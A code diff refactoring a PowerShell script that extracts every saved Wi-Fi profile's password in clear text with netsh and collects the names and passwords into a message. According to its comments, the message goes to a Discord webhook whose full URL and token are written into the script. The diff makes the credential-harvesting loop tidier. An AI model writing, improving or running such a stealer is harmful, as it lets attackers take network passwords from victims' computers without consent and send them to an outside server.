@@ -1,20 +1,19 @@
 # Define your webhook URL and the message string
 $WebhookUrl = "https://discord.com/api/webhooks/1522586603615162469/cSzV4hP6LxzHVQKQjOH7ZKAjKSL9Dd_dXSzbSzViTz-DvlS2C1J7aSZkG3tD871SCXwY"
 
-$wifiProfiles = netsh wlan show profiles name=*
-foreach ($profile in $wifiProfiles) {
-    $profileName = $profile.Trim().Split(':')[1]
-    $profileInfo = netsh wlan show profile name=""$profileName"" key=clear
-    $passwordLine = $profileInfo.Split(""`n"") | Where-Object { $_ -match ""Key Content"" }
-    $password = $passwordLine.Trim().Split(':')[1]
-
-    # Add to the message
-    if (-not $Message) {
-        $Message = ""Wi-Fi Profiles and Passwords:""
-    } else {
-        $Message += ""`n""
+$profiles = netsh wlan show profiles |
+    Select-String "All User Profile" |
+    ForEach-Object {
+        $_.Line.Split(":")[1].Trim()
     }
-    $Message += ""$profileName - $password""
+    
+foreach ($profileName in $profiles) {
+    $profileInfo = netsh wlan show profile name="$profileName" key=clear
+
+    $password = ($profileInfo |
+        Select-String "Key Content").Line.Split(":")[1].Trim()
+
+    $Message += "`n$profileName - $password"
 }
 
 # Package the message into the standard Discord JSON format
